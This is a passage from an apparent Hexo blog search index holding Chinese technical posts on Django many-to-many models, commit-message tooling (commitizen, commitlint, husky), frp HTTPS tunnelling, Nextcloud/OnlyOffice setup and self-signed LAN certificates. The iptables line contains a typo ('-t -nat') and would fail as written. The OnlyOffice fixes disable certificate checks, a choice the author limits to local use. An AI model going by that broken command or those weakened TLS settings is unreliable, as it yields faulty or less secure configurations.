class="title class_">Author</span>(models.Model):</span><br><span class="line">    name = models.CharField(max_length=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Book</span>(models.Model):</span><br><span class="line">    name = models.CharField(max_length=<span class="number">20</span>)</span><br><span class="line">    <span class="comment"># 定义多对多关系</span></span><br><span class="line">    authors = models.ManyToManyField(Author)</span><br></pre></td></tr></table></figure><p>其模型关系示意图如下所示：</p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202110041553599.png!def" class="" width="300"><h3 id="创建数据-3">创建数据</h3><p>两者创建没有先后顺序之分。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 法1. 先创建Author再关联Book</span></span><br><span class="line">a1 = Author.objects.create(name=<span class="string">&#x27;a1&#x27;</span>)</span><br><span class="line">a2 = Author.objects.create(name=<span class="string">&#x27;a2&#x27;</span>)</span><br><span class="line">b1 = a1.book_set.create(name=<span class="string">&#x27;b1&#x27;</span>)</span><br><span class="line">a2.book_set.add(b1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 法2. 先创建Book再关联Author</span></span><br><span class="line">b2 = Book.objects.create(name=<span class="string">&#x27;b2&#x27;</span>)</span><br><span class="line">a3 = b2.authors.create(name=<span class="string">&#x27;a3&#x27;</span>)</span><br><span class="line">b2.authors.add(a1)</span><br></pre></td></tr></table></figure><p>Book和Author数据库表中的数据如下所示：</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202110041610499.png!def" alt="image-20211004161027428"></p><p>两者的关系表中的数据如下所示，记录了两者的所有关系：</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202110041611765.png!def" alt="image-20211004161128680"></p><h3 id="查询数据-3">查询数据</h3><ul><li><p>正向查询，通过<code>Book</code>查<code>Author</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取所有数据</span></span><br><span class="line">b1.authors.<span class="built_in">all</span>()</span><br><span class="line"><span class="comment"># 过滤数据</span></span><br><span class="line">b1.authors.<span class="built_in">filter</span>(<span class="string">&#x27;...&#x27;</span>)</span><br></pre></td></tr></table></figure></li><li><p>反向查询，通过<code>Author</code>查<code>Book</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a1.book_set.<span class="built_in">all</span>()</span><br><span class="line">a1.book_set.<span class="built_in">filter</span>(<span class="string">&#x27;...&#x27;</span>)</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Django </tag>
            
            <tag> website </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用commitizen+commitlint+husky规范代码提交注释</title>
      <link href="/posts/3681943647.html"/>
      <url>/posts/3681943647.html</url>
      
        <content type="html"><![CDATA[<p>最近在研究腾讯的自动化部署功能时，发现有篇文档介绍了如何规范代码提交：<a href="https://help.coding.net/docs/ci/lint/git-commit.html">Git commit message 规范</a>，然而在按照文档进行操作时，却无法正确运行。通过搜索发现，主要是husky已经升级到了<code>7</code>版本，与之前的版本无法兼容。下文记录了该方案的安装过程，备后续部署时参考。</p><h1>安装commitizen</h1><p><code>commitizen</code>在提交代码的时候提供了一个交互式的选择界面，方便用户自动生成符合规范的代码提交注释。</p><p>使用如下命令即可安装<code>commitizen</code>：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install -g commitizen cz-conventional-changelog</span><br><span class="line">echo &#x27;&#123; &quot;path&quot;: &quot;cz-conventional-changelog&quot; &#125;&#x27; &gt; ~/.czrc</span><br></pre></td></tr></table></figure><p>在powershell中，生成的<code>.czrc文件</code>是utf-16格式的，需要修改成utf-8格式。</p><p>之后，使用<code>git cz</code>或<code>cz</code>代替原来的<code>git commit -m</code>命令进行代码提交。</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202108311327886.png!def" alt="image-20210831132718689"></p><p>如上图所示，使用上下方向按键即可选择提交类别，之后的内容按照提示填写即可。</p><p>该方案使用的是angular项目的规范，各字段的详细说明可参考：<a href="https://zhuanlan.zhihu.com/p/132348944">使用 commitizen 规范 Git 提交说明 - 知乎 (zhihu.com)</a></p><h2 id="在项目中安装commitizen">在项目中安装commitizen</h2><p>有些情况下，可能不需要全局安装<code>commitizen</code>，而仅仅是需要在当前项目中使用，那么可以使用<code>--save-dev</code>方式进行安装。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install --save-dev commitizen</span><br><span class="line">npx commitizen init cz-conventional-changelog --save-dev --save-exact</span><br></pre></td></tr></table></figure><p>这种情况下，不能使用<code>git cz</code>方式进行提交，而应该使用<code>npx cz</code>命令进行提交。或者，也可以在<code>package.json</code>中定义一个scripts，利用<code>npm run</code>的方式进行提交。如：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  ...<span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;cz&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cz&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>此时，可使用<code>npm run cz</code>进行提交。</p><h1>安装commitlint</h1><p><code>commitlint</code>是一个提交注释检查工具，可以根据指定的规则对提交信息进行检查。使用如下命令进行安装：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install --save-dev @commitlint/cli @commitlint/config-conventional</span><br><span class="line">echo &quot;module.exports = &#123; extends: [&#x27;@commitlint/config-conventional&#x27;] &#125;;&quot; &gt; commitlint.config.js</span><br></pre></td></tr></table></figure><p>对于第二行的配置信息，除了单独在<code>commitlint.config.js</code>文件中进行指定，还可以在项目的<code>package.json</code>中新建一个<code>commitlint</code>块，在其中进行指定。</p><p>可以使用<code>npx commitlint --from=HEAD~1</code>检查上一条提交信息是否符合规范，还可以指定它从文件中读取信息进行检测。</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202108311349809.png!def" alt="image-20210831134917745"></p><h1>安装husky实现自动检测</h1><p>每次在提交前使用命令手动测试是很麻烦的，可以使用hook工具自动在提交时检测提交的注释是否合规。对于git来说，<code>husky</code>是一个很好用的hook工具。</p><p>目前，部分教程文档都将配置信息放到<code>package.json</code>的husky字段中，如：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;husky&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;hooks&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;commit-msg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;commitlint -E HUSKY_GIT_PARAMS&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><p>此方法尝试无效，可能是版本不兼容的问题。当前安装的husky版本为7.0.2，不保证之后的版本适用下文的安装和使用方式，安装过程建议参考官方文档<a href="https://typicode.github.io/husky/#/">Husky - Git hooks (typicode.github.io)</a>。</p><h2 id="安装">安装</h2><p>对于Unix类系统，直接使用<code>npx husky-init &amp;&amp; npm install</code>进行安装即可，会自动完成所有的安装步骤。windows系统的powershell似乎不支持&amp;&amp;操作符，只能手动进行安装：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1. 安装husky</span></span><br><span class="line">npm install husky --save-dev</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2. 激活hooks</span></span><br><span class="line">npx husky install</span><br><span class="line">npm set-script prepare &quot;husky install&quot;</span><br></pre></td></tr></table></figure><p>如果成功安装，在项目根目录会出现<code>.husky</code>目录，其内容如下所示，如果是使用的自动安装的方式，应该还会多一个<code>pre-commit</code>文件，指定了commit之前的操作，如果不需要可以删除。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\.husky</span><br><span class="line">└─_</span><br><span class="line">  └─.gitignore</span><br><span class="line">  └─husky.sh</span><br></pre></td></tr></table></figure><h2 id="配置">配置</h2><p>可以使用<code>npx husky add&quot;</code>命令来创建hook脚本，我们需要在进行commit操作时对提交信息进行检测，则应该对<code>commit-msg</code>阶段进行hook，具体指令为<code>npx husky add .husky/commit-msg 'npx --no-install commitlint --edit &quot;$1&quot;'</code>。执行后，在<code>.husky</code>目录新增了commit-msg文件，其内容如下：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">. &quot;$(dirname &quot;$0&quot;)/_/husky.sh&quot;</span><br><span class="line"></span><br><span class="line">npx --no -- commitlint --edit $1</span><br><span class="line"></span><br></pre></td></tr></table></figure><div class="note info flat"><p>在Linux的shell环境中，上述指令可能无法将<code>$1</code>字符串正确地写入文件，此时需要手动对文件进行修改。</p></div><p>可以手动修改文件内容，以执行不同的操作。</p><p>当我们尝试提交时，输入了不符合规范的提交信息，则会对出错的地方给出提示，同时本次提交也不会成功。</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202108311428040.png!def" alt="image-20210831142840971"></p><h2 id="另一种调用commitizen的方法">另一种调用commitizen的方法</h2><p>安装完husky后，通过对<code>prepare-commit-msg</code>阶段进行hook，可以在提交阶段对commit注释进行重新修改，此时，可以考虑省去<code>commitlint</code>的步骤。具体方法如下：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加prepare-commit-msg的hook</span></span><br><span class="line">npx husky add .husky/prepare-commit-msg &quot;exec &lt; /dev/tty &amp;&amp; node_modules/.bin/cz --hook || true&quot;</span><br></pre></td></tr></table></figure><p>此后，当需要提交代码时，使用<code>git commit</code>命令就会自动调用<code>commitizen</code>。</p><div class="note info flat"><p>经测试，如果<code>commit</code>后面没有加上<code>-m</code>选项，则在调用完<code>commitizen</code>后，仍然会调用git的输入commit注释的交互界面（与未hook的情况一样）。因此，该方法仅提供参考，实用性不大。</p></div><h1>参考资料</h1><ol><li><a href="https://help.coding.net/docs/ci/lint/git-commit.html">Git commit message 规范 - CODING 帮助中心</a></li><li><a href="https://zhuanlan.zhihu.com/p/132348944">使用 commitizen 规范 Git 提交说明 - 知乎 (zhihu.com)</a></li><li><a href="https://www.jianshu.com/p/36d970a2b4da">简单使用Commitizen-规范你的commit message - 简书 (jianshu.com)</a></li><li><a href="https://typicode.github.io/husky/#/">Husky - Git hooks (typicode.github.io)</a></li><li><a href="https://blog.csdn.net/crper/article/details/118909053">husky 7 + lint-staged 11+ prettier 2 + eslint 7 配置_CRPER-CSDN博客</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用frp实现内外网https访问</title>
      <link href="/posts/1662951709.html"/>
      <url>/posts/1662951709.html</url>
      
        <content type="html"><![CDATA[<p>自建的nextcloud在使用docker部署时，没有选择映射80端口，而且其默认的nginx配置也是把80端口的访问重定向到了443端口，因此只能使用https协议访问。搜索网上资料时发现，大部分的frp（<a href="https://github.com/fatedier/frp">fatedier/frp</a>）教程是把外网的https访问转换成http协议来访问内网客户端，这显然不符合我的需求。</p><p>查看frp的发行日志，发现其在0.36版本开始新增了<code>https2https</code>插件，实现了内外网的https转换，下面就做一个简单记录。</p><span id="more"></span><h1>服务器端的配置</h1><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># filename: frps.ini</span></span><br><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">token</span> = xxxxxxx</span><br><span class="line"><span class="comment"># https访问时使用的端口</span></span><br><span class="line"><span class="attr">vhost_https_port</span> = <span class="number">8000</span></span><br></pre></td></tr></table></figure><blockquote><p>HTTP 和 HTTPS 协议的一个特点是发送的请求都具有 Host 字段，通过该字段描述要访问的服务。基于这个特点，frp 服务端只需要监听在一个端口(通过 <code>vhost_http_port</code> 和 <code>vhost_https_port</code> 指定)。就可以根据请求的 Host 来决定需要路由给哪一个代理，而不需要像 TCP 类型那样为每一个服务绑定一个端口。</p></blockquote><p>简而言之，需要代理的https访问都需要发送到该端口。</p><h1>客户端配置</h1><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment">#filename: frpc.ini</span></span><br><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = x.x.x.x</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">token</span> = xxxxxxx</span><br><span class="line"></span><br><span class="line"><span class="section">[nextcloud_web]</span></span><br><span class="line"><span class="attr">type</span> = https</span><br><span class="line"><span class="attr">custom_domains</span>  = www.domain.com</span><br><span class="line"><span class="attr">plugin</span> = https2https</span><br><span class="line"><span class="comment"># 本地服务地址</span></span><br><span class="line"><span class="attr">plugin_local_addr</span> = <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8443</span></span><br><span class="line"><span class="comment"># https所需的证书文件</span></span><br><span class="line"><span class="attr">plugin_crt_path</span> = /root/certs/cert.pem</span><br><span class="line"><span class="comment"># https所需的密钥文件</span></span><br><span class="line"><span class="attr">plugin_key_path</span> = /root/certs/key.pem</span><br></pre></td></tr></table></figure><p>注意要使用正确的证书，如本例的域名为<code>www.domain.com</code>，则应该使用该域名对应的证书，而不是之前自己手动生成的证书。证书的申请在此不再赘述，网上的教程很多。可以在域名提供商处下载免费的单域名证书，也可以用acme.sh生成泛域名证书。</p><h1>启动frp</h1><ol><li><p>分别启动frps和frpc。注意服务器端放行frps监听的端口。</p></li><li><p>尝试通过<code>https://www.domain.com:8000</code>访问nextcloud，会弹出如下提示，告诉我们不是从可信任的域名访问的，根据提示，只需要将我们的域名加入到<code>trusted_domains</code>中即可。</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202108221121914.png" alt="image-20210822112059743"></p><p>如果和我一样使用的是linuxserver发布的nextcloud镜像，则修改config/www/nextcloud/config/config.php，在下图所示的红色矩形框位置添加自己的域名即可，无需重启。<a href="https://docs.nextcloud.com/server/22/admin_manual/installation/installation_wizard.html#trusted-domains">Installation wizard — Nextcloud latest Administration Manual latest documentation</a></p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202108221121655.png" alt=""></p></li></ol><h1>进阶设置</h1><ul><li><p>利用frp的二级域名功能简化配置</p><ol><li><p>在服务器端的frps.ini的<code>common</code>中添加<code>subdomain_host</code>字段，如<code>subdomain_host = domain.com</code></p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># frps.ini</span></span><br><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">subdomain_host</span> = domain.com</span><br></pre></td></tr></table></figure></li><li><p>在客户端的frpc.ini中的各个需要配置域名的配置中填写域名前缀，如<code>subdomain = www</code></p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># frpc.ini</span></span><br><span class="line"><span class="section">[nextcloud_web]</span></span><br><span class="line"><span class="comment"># 此处需要把custom_domains字段删除，其他不变</span></span><br><span class="line"><span class="attr">subdomain</span> = nc</span><br><span class="line"><span class="section">[web]</span></span><br><span class="line"><span class="comment"># 仅为示例，其余相关字段省略</span></span><br><span class="line"><span class="attr">subdomain</span> = web</span><br></pre></td></tr></table></figure></li><li><p>这样，可以通过<code>https://nc.domain.com:8000</code>访问nextcloud，通过<code>https://web.domain.com:8000</code>访问web服务页面。</p></li></ol></li><li><p>配置端口转发，省略链接后面的端口</p><p>想要省略链接后面的端口号，最简单的方法就是将frp服务端的https监听端口（即<code>vhost_https_port</code>）为<code>443</code>，但是ubuntu默认只有root用户可以监听443端口，所以要么选择以root身份执行frps，要么配置端口转发。</p><p>ubuntu可以利用iptables进行端口转发，使用到的命令为：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -t -nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8000</span><br></pre></td></tr></table></figure><p><code>--dport</code>为需要被转发的端口号，<code>--to-port</code>为转发到的端口号，即frp监听的端口。注意iptables的设置默认重启后即失效，可以参考下面参考资料给出的方法，配置自动加载。且部分资料提及需要设置<code>ip_forward=1</code>来打开端口转发功能，本人的系统已经打开，未测试不开启的情况下端口转发是否有效。</p><p>这样，即可使用<code>https://nc.domain.com</code>访问nextcloud了。</p></li></ul><h1>参考资料</h1><ol><li><a href="https://gofrp.org/docs/">文档 | frp (gofrp.org)</a></li><li><a href="https://blog.csdn.net/lggirls/article/details/111544017">Nextcloud 结合frp搭建私有网盘_lggirls的博客-CSDN博客</a></li><li><a href="https://blog.csdn.net/wenzuowei110/article/details/7871971">linux 不能开启443端口_wenzuowei110的博客-CSDN博客</a></li><li><a href="https://www.cnblogs.com/ddif/p/9940571.html">Ubuntu环境下的iptables的端口转发配置实例 - ddif - 博客园 (cnblogs.com)</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> nas </category>
          
      </categories>
      
      
        <tags>
            
            <tag> frp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安装nextcloud和onlyoffice遇到的坑</title>
      <link href="/posts/2670779669.html"/>
      <url>/posts/2670779669.html</url>
      
        <content type="html"><![CDATA[<p>本文记录使用docker安装nextcloud和onlyoffice时，遇到的问题及解决方法。</p><p>本机的操作系统为TrueNAS-SCALE-21.06-BETA.1，docker版本20.10.6。</p><h1>安装nextcloud</h1><p>推荐使用linuxserver发布的镜像，配置参数少，默认使用nginx。<a href="https://hub.docker.com/r/linuxserver/nextcloud">linuxserver/nextcloud - Docker Image | Docker Hub</a></p><p>下文所说的config目录均为映射的container内部的/config目录，例如使用 <code>-v /path/to/appdata:/config</code>，则下文的的config/目录即为<code>/path/to/appdata/</code>。</p><p>安装完成后，由于映射的443端口，因此需要配置证书。考虑到仅在局域网内使用，因此还是使用上篇文章生成的web证书。</p><p>查看<code>config/nginx/site-confs/default</code>配置文件，截取部分内容如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 443 ssl http2;</span><br><span class="line">    listen [::]:443 ssl http2;</span><br><span class="line">    server_name _;</span><br><span class="line">    ssl_certificate /config/keys/cert.crt;</span><br><span class="line">    ssl_certificate_key /config/keys/cert.key;</span><br></pre></td></tr></table></figure><p>发现证书的存放位置为config/keys，且需要命名为cert。当然位置及名字可以根据自己的需要修改。将证书放入对应位置后，重新刷新页面看证书是否被正确识别，如果有问题可以重启nextcloud试试。</p><span id="more"></span><h1>安装onlyoffice</h1><h2 id="安装server端">安装server端</h2><p>请严格按照官方的安装步骤来进行安装，可以避免掉许多坑（下文会说明）。<a href="https://helpcenter.onlyoffice.com/installation/docs-community-install-docker.aspx">Installing ONLYOFFICE Docs for Docker on a local server - ONLYOFFICE</a></p><p>记得按照文档说明将证书放入对应位置。</p><p>onlyoffice启动较慢，安装完成后等待一两分钟，按照docker配置的端口打开<code>https://&lt;ip&gt;:&lt;port&gt;</code>，看是否出现成功安装的界面。</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202108171513774.png" alt="image-20210817151334699"></p><p>【注意】即使出现了此界面也不代表完全成功，但是没有此界面则不成功，尝试重装。</p><h2 id="安装onlyoffice插件">安装onlyoffice插件</h2><p>点击nextcloud右上角的头像，会展开一个下拉菜单，选择<code>应用</code>选项。在新页面中选择<code>Files</code>或者<code>Office &amp; text</code>分类，都可以找到<code>ONLYOFFICE</code>插件，点击后在详情页面点击<code>下载并启用</code>按钮，便会开始下载该插件。由于网络原因，部分用户可能无法下载，提示<code>请求期间发生错误。 无法继续</code>。这时，可以使用手动下载的方式进行安装。参考<a href="https://blog.csdn.net/boliang319/article/details/106216928">手动为Nextcloud安装插件（App）</a>。</p><ol><li><p>打开onlyoffice插件地址<a href="https://apps.nextcloud.com/apps/onlyoffice">ONLYOFFICE - Apps - App Store - Nextcloud</a>，按照nextcloud的版本找到对应的插件版本，点击版本号即可下载，或者右键版本号选择复制链接，复制到自己常用的下载器中下载。</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202108171504021.png" alt="image-20210817150434861"></p></li><li><p>将下载到的压缩包放入<code>config/www/nextcloud/apps</code>中，使用 <code>tar -zxvf onlyoffice.tar.gz</code>解压（压缩包名字可能不同，按照实际情况修改）。</p></li><li><p>在nextcloud的<code>应用</code>页面，找到onlyoffice并启用。此时，就可以在<code>设置</code>-<code>管理</code>里看到<code>ONLYOFFICE</code>选项标签。</p></li><li><p>在<code>ONLYOFFICE Docs地址</code>地址处，填入server端的地址及端口号即可。</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202108171523370.png" alt="image-20210817152346270"></p></li></ol><h1>配置</h1><p>前面的安装工作完成后，就进入到了配置阶段，在这一阶段遇到了非常多的问题，下面按步骤进行说明。</p><ol><li><p>填入onlyoffice的本地服务器地址，提示<code>Host violates local access rules</code></p><p>参考github上的两篇issue，<a href="https://github.com/ONLYOFFICE/onlyoffice-nextcloud/issues/293">Nextcloud 19 compatibility · Issue #293 </a>、[<a href="https://github.com/nextcloud/integration_moodle/issues/24">NC22] Host violates local access rules · Issue #24 </a>，配置文件中添加<code>'allow_local_remote_servers' =&gt; true,</code>即可。修改配置文件有两种方法：</p><ol><li>直接修改配置文件config.php，此文件位于<code>config/www/nextcloud/config</code>中。</li><li>通过occ命令修改，连接到容器的控制台，执行<code>occ config:system:set allow_local_remote_servers --value true --type bool</code>。（linuxserver发布的镜像不需要在命令前加上<code>sudo -u www-data php</code>前缀）</li></ol></li><li><p>报错<code>cURL error 60: SSL certificate problem: unable to get local issuer certificate (see https://curl.haxx.se/libcurl/c/libcurl-errors.html) for https://xxx:xx/healthcheck)</code></p><p>应该是onlyoffice的证书颁发机构不受信任（毕竟是自签名的证书），尝试按照<a href="https://blog.csdn.net/boliang319/article/details/105651678">使用Docker及自签署证书为Nextcloud配置Onlyoffice（二）</a>的说明将ca证书放入nextcloud容器中，更新证书时提示<code>WARNING: ca-certificates.crt does not contain exactly one certificate or CRL: skipping</code>，但是在终端中使用curl命令连接onlyoffice的ip时没有报错。</p><p>此时，在nexecloud页面上保存onlyoffice服务器地址时，仍然显示该错误，暂时无解，只能关闭证书校验（只在本地使用问题不大）。</p></li><li><p>报错<code>Bad healthcheck status</code></p><p>在浏览器中自己打开<code>https://&lt;ip&gt;:&lt;port&gt;/healthcheck</code>，返回<code>false</code>，判断是onlyoffice服务端的问题。查询onlyoffice的输出信息（可以通过portainer或者docker logs命令），可以看到<code>error: password authentication failed for user &quot;onlyoffice&quot;</code>的错误信息，猜测可能是容器内部连接到数据库时出错，大概率是映射的数据库目录的读写权限出了问题。因此，取消了<code>/var/lib/postgresql</code>目录的映射，同时<code>/var/lib/onlyoffice</code>目录似乎也用不到，一并取消映射。重启容器后问题解决。</p></li><li><p>报错<code>文档服务内部发生异常: Error while downloading the document file to be converted.</code></p><p>很明显是onlyoffice在下载nextcloud存储的文档时，出现了错误，猜测是nextcloud的证书问题。想到前面nextcloud连接onlyoffice也是类似的证书问题，尝试寻找onlyoffice跳过证书检查的方法。仔细翻阅安装文档，发现可以通过设置<code>USE_UNAUTHORIZED_STORAGE</code>变量为<code>true</code>来解决。添加该环境变量后重启容器，问题解决。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> nas </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nextcloud </tag>
            
            <tag> onlyoffice </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>局域网内服务器证书申请</title>
      <link href="/posts/128566356.html"/>
      <url>/posts/128566356.html</url>
      
        <content type="html"><![CDATA[<p>为了可以使用https协议访问局域网内的服务器，收集并整理了网上有关局域网证书签发的资料。</p><h1>生成CA</h1><ol><li><p>创建CA使用的密钥</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl genrsa -out ca.key</span><br></pre></td></tr></table></figure></li><li><p>生成根CA证书</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl req -new -x509 -key ca.key -out ca.crt -days 3650</span><br></pre></td></tr></table></figure></li><li><p>将CA证书放入受信任的根证书颁发机构（windows系统）</p></li></ol><span id="more"></span><h1>签发服务器使用的证书</h1><ol><li><p>生成证书使用的密钥</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl genrsa -out web.key</span><br></pre></td></tr></table></figure></li><li><p>生成证书请求文件CSR</p><p>由于我们的服务器是通过ip地址或域名都可访问的，所以在申请证书时，需要修改默认的配置文件以添加额外信息。可以将默认的<code>openssl.cnf</code>文件复制一份后进行修改，该文件所在位置在openssl的<code>OPENSSLDIR</code>目录中，可以通过<code>openssl version -a</code>命令获取。</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文件名为 openssl.cnf</span></span><br><span class="line"><span class="section">[ req ]</span></span><br><span class="line"><span class="attr">default_bits</span>= <span class="number">2048</span></span><br><span class="line"><span class="attr">distinguished_name</span>= req_distinguished_name</span><br><span class="line"><span class="attr">req_extensions</span> = req_ext </span><br><span class="line"></span><br><span class="line"><span class="section">[ req_distinguished_name ]</span></span><br><span class="line"><span class="attr">countryName</span>                     = Country Name (<span class="number">2</span> letter code)</span><br><span class="line"><span class="attr">countryName_default</span>             = CN</span><br><span class="line"><span class="attr">countryName_min</span>                 = <span class="number">2</span></span><br><span class="line"><span class="attr">countryName_max</span>                 = <span class="number">2</span></span><br><span class="line"><span class="attr">stateOrProvinceName</span>             = State or Province Name (full name)</span><br><span class="line"><span class="attr">stateOrProvinceName_default</span>     = JS</span><br><span class="line"><span class="attr">localityName</span>                    = Locality Name (eg, city)</span><br><span class="line"><span class="attr">0.organizationName</span>              = Organization Name (eg, company)</span><br><span class="line"><span class="attr">0.organizationName_default</span>      = Internet Widgits Pty Ltd</span><br><span class="line"><span class="attr">organizationalUnitName</span>          = Organizational Unit Name (eg, section)</span><br><span class="line"><span class="attr">organizationalUnitName_default</span> = Nas</span><br><span class="line"><span class="attr">commonName</span>                      = Common Name (e.g. server FQDN or YOUR name)</span><br><span class="line"><span class="attr">commonName_max</span>                  = <span class="number">64</span></span><br><span class="line"><span class="attr">emailAddress</span>                    = Email Address</span><br><span class="line"><span class="attr">emailAddress_max</span>                = <span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="section">[ req_ext ]</span></span><br><span class="line"><span class="attr">subjectAltName</span> = @alt_names</span><br><span class="line"></span><br><span class="line"><span class="section">[alt_names]</span></span><br><span class="line"><span class="attr">DNS.1</span> = *.mtnas.local</span><br><span class="line"><span class="attr">IP.1</span> = <span class="number">192.168</span>.<span class="number">50.2</span></span><br></pre></td></tr></table></figure><p>如果是有多个域名，则可以继续添加<code>DNS.2</code>、<code>DNS.3</code>…，多个IP也同理。</p><p>之后使用如下命令来生成csr文件。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl req -new -sha256 -out web.csr -key web.key -config openssl.cnf</span><br></pre></td></tr></table></figure></li><li><p>证书签名</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl x509 -req -<span class="keyword">in</span> web.csr -CA ca.crt -CAkey ca.key -CAcreateserial \</span><br><span class="line">-days 365 -out web.crt -extensions req_ext -extfile openssl.cnf</span><br></pre></td></tr></table></figure></li></ol><h1>参考资料</h1><ol><li><p><a href="https://blog.csdn.net/onebird_lmx/article/details/107938396">使用 openssl 创建自签发证书，含IP证书及泛域名证书</a></p></li><li><p><a href="https://www.cnblogs.com/will-space/p/11913744.html">OpenSSL自签发自建CA签发SSL证书</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cert </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kotlin开发Android的小技巧</title>
      <link href="/posts/4201669077.html"/>
      <url>/posts/4201669077.html</url>
      
        <content type="html"><![CDATA[<p>本文主要用于记录自己开发过程中觉得好用的编码技巧，主要来自于第三版的《第一行代码Android》以及博客。</p><h2 id="启动Activity">启动Activity</h2><p>常见的启动Activity的方法是</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> intent = Intent(<span class="keyword">this</span>, MyActivity::<span class="keyword">class</span>.java)</span><br><span class="line">intent.putExtra(<span class="string">&quot;param1&quot;</span>, <span class="string">&quot;data1&quot;</span>)</span><br><span class="line">intent.putExtra(<span class="string">&quot;param2&quot;</span>, <span class="string">&quot;data2&quot;</span>)</span><br><span class="line">startActivity(intent)</span><br></pre></td></tr></table></figure><p>使用这种方法每次都要重复编码，且容易忘记需要传递的参数的信息，可以通过在Activity中定义静态方法来简化，如下所示：</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyActivity</span> : <span class="type">AppCompatActivity</span></span>()&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">companion</span> <span class="keyword">object</span> &#123;</span><br><span class="line">        <span class="function"><span class="keyword">fun</span> <span class="title">actionStart</span><span class="params">(context: <span class="type">Context</span>, data1:<span class="type">String</span>, data2:<span class="type">String</span>)</span></span> &#123;</span><br><span class="line">            <span class="keyword">val</span> intent = Intent(context, MyActivity::<span class="keyword">class</span>.java)</span><br><span class="line">            intent.putExtra(<span 